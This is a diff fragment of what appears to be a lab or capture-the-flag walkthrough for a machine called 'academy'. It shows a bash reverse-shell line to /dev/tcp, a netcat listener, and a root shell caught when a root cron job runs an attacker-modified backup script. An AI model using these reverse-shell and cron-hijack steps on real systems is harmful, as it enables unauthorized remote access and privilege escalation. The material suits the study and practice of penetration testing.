@@ -667,3 +667,18 @@ bash -i >& /dev/tcp/192.168.64.4/8081 0>&1
 grimmie@academy:~$ 
 
 ```
+
+Now we will just wait for the cron job to execute the backup as root. As you below, we exploit the roor when the cron job back.sh run as root
+
+```
+┌──(root㉿kali)-[~]
+└─# nc -nvlp 8082
+listening on [any] 8082 ...
+connect to [192.168.64.4] from (UNKNOWN) [192.168.64.3] 42144
+bash: cannot set terminal process group (16166): Inappropriate ioctl for device
+bash: no job control in this shell
+root@academy:~# 
+
+```
+
+![[Pasted image 20240706031938.png]]
